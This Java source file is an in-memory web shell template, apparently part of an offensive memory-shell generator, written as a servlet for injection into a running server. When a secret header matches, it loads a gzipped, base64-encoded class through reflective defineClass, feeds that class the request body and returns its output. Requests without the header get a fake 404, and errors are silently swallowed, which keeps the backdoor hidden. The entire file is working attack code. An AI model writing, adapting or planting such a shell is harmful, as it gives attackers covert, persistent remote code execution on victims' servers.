package org.leo.jmg.mem.shell.http;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.zip.GZIPInputStream;

/**
 * Servlet 形态内存 Shell 模板（与 {@link LeoFilterTpl} 触发逻辑一致，供 Servlet 注册型注入器使用）
 */
public class LeoServletTpl extends HttpServlet {

    private static String headerName;
    private static String headerValue;

    private static String coreClassName;
    private static String coreClass;
    private static int respCode;

    @Override
    protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setStatus(respCode);
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                byte[] buffer = new byte[1024];
                int bytesRead;
                try {
                    Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader());
                } catch (ClassNotFoundException e) {
                    GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(coreClass)));
                    while ((bytesRead = gzipInputStream.read(buffer)) != -1) {
                        byteArrayOutputStream.write(buffer, 0, bytesRead);
                    }
                    Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass",
                            String.class, byte[].class, int.class, int.class);
                    defineClassMethod.setAccessible(true);
                    defineClassMethod.invoke(ClassLoader.getSystemClassLoader(),
                            null, byteArrayOutputStream.toByteArray(), 0, byteArrayOutputStream.size());
                } finally {
                    InputStream inputStream = request.getInputStream();
                    byteArrayOutputStream.reset();
                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                        byteArrayOutputStream.write(buffer, 0, bytesRead);
                    }
                    Class.forName(coreClassName, true, ClassLoader.getSystemClassLoader()).newInstance().equals(byteArrayOutputStream);
                    response.getOutputStream().write(byteArrayOutputStream.toByteArray());
                }
            } else {
                response.sendError(HttpServletResponse.SC_NOT_FOUND);
            }
        } catch (Exception ignored) {
            response.sendError(HttpServletResponse.SC_NOT_FOUND);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class<?> clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception var5) {
            Class<?> clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
}
